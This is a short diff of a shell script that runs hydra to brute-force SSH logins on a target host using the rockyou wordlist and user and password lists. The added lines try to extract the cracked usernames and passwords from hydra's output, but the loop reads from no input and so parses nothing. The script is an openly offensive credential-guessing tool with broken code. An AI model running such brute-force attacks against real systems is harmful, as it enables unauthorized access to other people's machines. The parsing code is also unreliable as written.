@@ -18,4 +18,11 @@ timeout 100 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$ip
 
 hydra -o output.txt -L users.txt -P pass.txt -t 22 ssh://$ip
 
+cat output.txt | head -1
+while read -r line; do
+    USERNAME=$(echo "$line" | awk -F'login: |password: ' '{print $2}')
+    PASSWORD=$(echo "$line" | awk -F'login: |password: ' '{print $3}')
+done
+
+  
 
